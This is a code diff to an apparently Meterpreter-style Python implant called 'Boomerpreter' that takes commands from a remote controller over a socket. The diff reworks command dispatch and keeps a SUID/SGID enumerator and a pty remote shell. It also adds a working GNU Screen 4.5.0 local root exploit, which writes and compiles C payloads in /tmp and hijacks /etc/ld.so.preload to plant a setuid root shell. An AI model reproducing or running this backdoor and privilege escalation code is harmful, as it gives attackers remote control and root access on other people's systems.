@@ -30,9 +30,10 @@ class Boomerpreter:
         self.platform_os = platform.platform()
         self.py_version = 3 if python_version().startswith("3") else 2
         self.options = {
-        "suid_sgid": ["get_suid_sgid", True],
-        "exit": ["exit", False],
-        "shell": ["get_shell", False]
+        "suid_sgid": "get_suid_sgid",
+        "exit": "exit",
+        "shell": "get_shell",
+        "root_screen45": "exploit_screen45"
         }
 
     def run(self):
@@ -44,73 +45,67 @@ class Boomerpreter:
             try:
                 opt = self.options[func]
                 if opt:
-                    if opt[1]:
-                        if len(args) > 0:
-                            data = getattr(self, opt[0])(args)
-                        else:
-                            data = b"Error: The function needs args"
-                    else:
-                        data = getattr(self, opt[0])()
+                    data = getattr(self, opt)(args)
             except Exception as e:
-                data = b"Error: " + str(e)
+                data = "Error: Operation " + str(e) + " not found"
             if not data:
                 continue
             if "exit" == data:
                 break
             self.send_data(data)
 
+
     def recv_data(self):
         data = self.socket.recv(1024)
-        if self.py_version == 3:
-            data = data.decode()
+        #if self.py_version == 3:
+        data = data.decode()
         return json.loads(data)
     
     def send_data(self, data):
         data = json.dumps(data)
-        if self.py_version == 3:
-            data = data.encode()
+        #if self.py_version == 3:
+        data = data.encode()
         self.socket.send(data)
-
-    def get_suid_sgid(self, request):
-        my_dir = request[0]
-        files_suid = []
-        files_sgid = []
-        for f in os.listdir(my_dir):
-            aux_file = os.path.join(my_dir, f)
-            if os.path.isfile(aux_file):
-                result = self._is_suid_sgid(aux_file)
-                if result[0]:
-                    files_suid.append(result[0])
-                if result[1]:
-                    files_sgid.append(result[1])
-        files_suid = "\n".join(files_suid)
-        files_sgid = ";".join(files_sgid)
-        files = "---SUID---\n" +files_suid + "\n---SGID---\n" + files_sgid
-        response = files
-        return response
-
-    def _is_suid_sgid(self, file_name):
-        results = []
-        try:
-            f = os.stat(file_name)
-            mode = f.st_mode
-        except:
-            return [None, None]
-        if (mode & stat.S_ISUID) == 2048:
-            results.append(file_name)
-        else:
-            results.append(None)
-        if (mode & stat.S_ISGID) == 1024:
-            results.append(file_name)
-        else:
-            results.append(None)
-        return results
     
     def exit(self):
-        self.socket.close()
+        try:
+            self.socket.close()
+        except:
+            pass
         return "exit"
-    
-    def get_shell(self, request="/bin/sh"):
+
+    # CALL FUNCTIONS BEGIN
+   
+    def get_suid_sgid(self, request):
+        if len(request) == 0:
+            return "Error: This function needs args"
+        files = ""
+        for my_dir in request:
+            files_suid = []
+            files_sgid = []
+            files += "[__ " + my_dir + " __]"
+            try:
+                for f in os.listdir(my_dir):
+                    aux_file = os.path.join(my_dir, f)
+                    if os.path.isfile(aux_file):
+                        result = self._is_suid_sgid(aux_file)
+                        if result[0]:
+                            files_suid.append(result[0])
+                        if result[1]:
+                            files_sgid.append(result[1])
+            except:
+                files += "Non-existing directory"
+                continue
+            files_suid = "\n".join(files_suid)
+            files_sgid = "\n".join(files_sgid)
+            files += "\n---SUID---\n" +files_suid + "\n---SGID---\n" + files_sgid
+        return files
+
+    def get_shell(self, request):
+        if len(request) == 0:
+            request = '/bin/sh'
+        else:
+            request = request[0]
         if has_pty:
             cmd = ['/bin/sh', '-c', request] 
             master, slave = pty.openpty()
@@ -148,6 +143,81 @@ class Boomerpreter:
                 time.sleep(1)
         else:
             return "No"
+        
+    def exploit_screen45(self, request):
+        try:
+            self.treat_files_screen45()
+        except:
+            return "Error creating files"
+        try:
+            self.compile_files_screen45()
+        except:
+            return "Error compiling files"
+        return "ok"
+        
+    # CALL FUNCTIONS END
+
+    # AUXILIAR FUNCTIONS BEGIN
+
+    def _is_suid_sgid(self, file_name):
+        results = []
+        try:
+            f = os.stat(file_name)
+            mode = f.st_mode
+        except:
+            return [None, None]
+        if (mode & stat.S_ISUID) == 2048:
+            results.append(file_name)
+        else:
+            results.append(None)
+        if (mode & stat.S_ISGID) == 1024:
+            results.append(file_name)
+        else:
+            results.append(None)
+        return results
+    
+    def treat_files_screen45(self):
+        libhax = open("/tmp/libhax.c", "w")
+        libhax.write('''
+            #include <stdio.h>
+            #include <sys/types.h>
+            #include <unistd.h>
+            __attribute__ ((__constructor__))
+            void dropshell(void){
+                chown("/tmp/shell", 0, 0);
+                chmod("/tmp/shell", 04755);
+                uid_t getuid(void){
+                    return 0;
+                }
+                
+            }
+            ''')
+        libhax.close()
+        shell = open("/tmp/shell.c", "w")
+        shell.write('''
+                #include <stdio.h>
+                int main(void){
+                unlink("/etc/ld.so.preload");
+                execvp("/bin/sh", NULL, NULL);
+                }
+                ''')
+        shell.close()
+
+    def compile_files_screen45(self):
+        os.popen("""
+            screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
+            screen -D -m gcc -z execstack -o /tmp/shell /tmp/shell.c 2> /dev/null;
+            rm -f /tmp/shell.c; rm -f /tmp/libhax.c
+            """)
+        os.popen('''
+            umask 0;
+            screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
+            ''')
+        time.sleep(3)
+        os.system("screen -lsq 2>&1 >/dev/null")
+    
+     # AUXILIAR FUNCTIONS END
+
 
 #Thanks Metasploit
 class STDProcessBuffer(threading.Thread):
@@ -200,7 +270,7 @@ class STDProcess(subprocess.Popen):
         self.stdin.write(channel_data)
         self.stdin.flush()
         
-
+# s is the socket
 address = s.getpeername()
 if hasattr(os, 'fork'):
     pid = os.fork()
